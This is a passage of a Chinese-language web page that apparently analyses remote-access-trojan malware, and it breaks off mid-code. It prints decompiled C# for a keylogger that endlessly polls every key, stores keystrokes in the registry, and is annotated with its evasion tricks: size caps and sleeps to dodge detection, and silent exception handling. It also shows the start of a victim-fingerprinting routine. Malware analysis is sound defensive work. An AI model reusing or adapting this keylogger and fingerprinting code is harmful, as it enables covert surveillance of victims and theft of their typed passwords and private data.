style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">keyCode</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">32767</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">&#x26;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Keyboard</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">CtrlKeyDown</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#5DA994;--1:#2E8F82">Keys</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">pressedKey</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Keys</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#BD976A;--1:#B07D48">keyCode</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 转换为Keys枚举（如Enter、A、1等）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">keyText</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Fix</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">pressedKey</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 格式化按键（如Enter→[Enter]、空格→[Space]）</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">keyText</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">></span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 过滤无效按键</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">AV</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// AV()：可能是添加时间戳/分隔符（如[2026-01-18 10:00]）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">keyText</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 拼接按键内容到日志</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">lastKey</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">pressedKey</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 记录最后一次按下的键（避免重复记录）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">keyCode</span><span style="--0:#CB7676;--1:#AB5959">++</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 遍历所有按键码（0-255）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">while</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">keyCode</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">&#x3C;=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">255</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 覆盖所有键盘按键（字母、数字、特殊键、功能键）</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 定期清理+持久化日志（每1000次循环执行） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">loopCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1000</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">loopCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 重置计数器</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 限制日志大小：20KB（20*1024字节），避免日志过大触发安全检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">maxLogSize</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToInteger</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">20</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">*</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1024</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">></span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">maxLogSize</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 截断日志：仅保留最后maxLogSize长度的内容，删除早期日志</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Remove</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">maxLogSize</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 持久化：调用STV函数将日志写入注册表（类型1=String）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">STV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">vn</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 1ms延迟：降低CPU占用，规避“高CPU占用”的行为检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 静默捕获所有异常：无日志、无弹窗、无错误提示，用户完全无感知</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="public void WRK(){    // 初始化：从注册表读取历史键盘日志（this.vn是注册表键名，OK.GTV=读取注册表值）    this.Logs = Conversions.ToString(OK.GTV(this.vn, &#x22;&#x22;));    checked // 启用溢出检查，避免日志拼接时内存溢出导致程序崩溃    {        try        {            int loopCount = 0; // 循环计数器，用于定期清理/存储日志            // 核心无限循环：永不退出，持续监听按键            for (;;)            {                loopCount++;                int keyCode = 0; // 按键码（0-255覆盖所有常用键盘按键）                do                {                    // ========== 核心：检测按键是否被按下 ==========                    // kl.GetAsyncKeyState(num2)：检测指定按键码的按键状态（-32767=按下）                    // !OK.F.Keyboard.CtrlKeyDown：排除Ctrl键按下的场景（避免误记录快捷键/规避检测）                    if (kl.GetAsyncKeyState(keyCode) == -32767 &#x26; !OK.F.Keyboard.CtrlKeyDown)                    {                        Keys pressedKey = (Keys)keyCode; // 转换为Keys枚举（如Enter、A、1等）                        string keyText = this.Fix(pressedKey); // 格式化按键（如Enter→[Enter]、空格→[Space]）                        if (keyText.Length > 0) // 过滤无效按键                        {                            this.Logs += this.AV(); // AV()：可能是添加时间戳/分隔符（如[2026-01-18 10:00]）                            this.Logs += keyText; // 拼接按键内容到日志                        }                        this.lastKey = pressedKey; // 记录最后一次按下的键（避免重复记录）                    }                    keyCode++; // 遍历所有按键码（0-255）                }                while (keyCode <= 255); // 覆盖所有键盘按键（字母、数字、特殊键、功能键）                // ========== 定期清理+持久化日志（每1000次循环执行） ==========                if (loopCount == 1000)                {                    loopCount = 0; // 重置计数器                    // 限制日志大小：20KB（20*1024字节），避免日志过大触发安全检测                    int maxLogSize = Conversions.ToInteger(&#x22;20&#x22;) * 1024;                    if (this.Logs.Length > maxLogSize)                    {                        // 截断日志：仅保留最后maxLogSize长度的内容，删除早期日志                        this.Logs = this.Logs.Remove(0, this.Logs.Length - maxLogSize);                    }                    // 持久化：调用STV函数将日志写入注册表（类型1=String）                    OK.STV(this.vn, this.Logs, 1);                }                Thread.Sleep(1); // 1ms延迟：降低CPU占用，规避“高CPU占用”的行为检测            }        }        catch (Exception ex)        {            // 静默捕获所有异常：无日志、无弹窗、无错误提示，用户完全无感知        }    }}"><div></div></button></div></figure></div>
<ul>
<li><strong><code>Inf()</code> (Info Stealer)</strong>: 搜集受害者的指纹信息（操作系统、用户名、安装的杀毒软件列表、摄像头有无），帮助攻击者评估目标价值。</li>
</ul>
<div class="expressive-code"><figure class="frame" style="--lnWidth:3ch"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">public</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">static</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">inf</span><span style="--0:#666666;--1:#999999">()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 初始化信息串：以"ll"+自定义分隔符OK.Y开头（指令标识+分隔符）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">ll</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第一步：采集设备唯一标识（硬件ID+注册表版本值，加密） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ConditionalCompareObjectEqual</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GTV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">vn</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">))</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 场景1：注册表"vn"值为空 → 解密OK.VN + 硬件唯一标识（OK.HWD）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">encryptedId</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DEB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">VN</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">_</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">HWD</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.HWD=获取硬件ID（如主板/硬盘序列号）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ENB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">encryptedId</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.ENB=加密后拼接</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 场景2：注册表"vn"值非空 → 读取并解密vn值 + 硬件ID，加密拼接</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">vnValue</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GTV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">vn</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">));</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 读注册表"vn"值</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">encryptedId</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DEB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">vnValue</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">_</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">HWD</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ENB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">encryptedId</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 采集失败：仅用硬件ID加密补充，不中断流程</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">encryptedHwd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">HWD</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ENB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">encryptedHwd</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span 